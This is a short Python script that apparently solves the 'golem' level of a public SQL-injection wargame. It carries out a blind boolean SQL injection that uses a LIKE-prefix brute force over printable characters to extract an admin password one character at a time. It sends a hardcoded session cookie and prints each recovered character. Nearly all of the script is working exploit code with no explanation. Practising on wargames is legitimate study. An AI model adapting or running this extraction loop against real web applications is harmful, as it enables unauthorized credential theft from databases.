import requests
import string

session = requests.Session()

url = "https://los.rubiya.kr/chall/golem_4b5202cfedd8160e73124b5234235ef5.php?pw=' || pw like '{}%"
cookies = {"PHPSESSID": "t2olebiumhrkeldqqkd0g2c5q0"}
pw = ""
for j in range(8):
    for i in string.printable:
        r = requests.get(url.format(pw+i), cookies=cookies)
        if('Hello admin' in r.text[:200] and i not in "#%&"):
            pw += i
            print("Password :", pw)
            break

print("Password :", pw)
